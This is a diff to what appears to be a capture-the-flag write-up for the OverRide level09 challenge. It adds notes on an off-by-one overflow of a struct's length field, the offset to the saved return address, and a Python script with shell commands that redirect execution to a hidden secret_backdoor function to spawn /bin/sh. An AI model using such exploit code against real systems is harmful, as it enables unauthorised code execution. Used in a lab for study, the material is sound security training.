@@ -134,6 +134,9 @@ secret_backdoor() isnt called anywhere, which has system()
 
 size of the buff 10 * 4 + 1 = 41
 
+the extra one is the next elem in the struct, the length of the msg, we overwrite it successfuly
+we will just need the exact offset to get from the start of the struct message the the EIP of handl_msg()
+
 ```
 so copy 41 bytes from the user input to some_struct->username
 ```
@@ -168,10 +171,38 @@ rip at 0x7fffffffe598
 p/d 0x7fffffffe598 - 0x7fffffffe4d0 = 200
 ```
 
-the offset is 200
+the offset is 200 + secret_backdoor = 208
+
+(gdb) p &secret_backdoor
+
+```py
+import struct
+
+user = "\x90" * 0x28
+
+msg_len = "\xd0"
+
+msg = "\x90" * 200
+
+eip = struct.pack('Q', 0x000000000000088c)
+
+bash = "/bin/sh"
+
+print user + msg_len
+print msg + eip
+print bash
+```
+
+```
+level09@OverRide:~$ python py.py > pay
+level09@OverRide:~$ (cat pay; cat) | ./level09
 
 
+```
 
+ Q: unsigned long long aka 8 bytes
+ 
+ I:  unsigned integer (4 bytes)
 
 
 
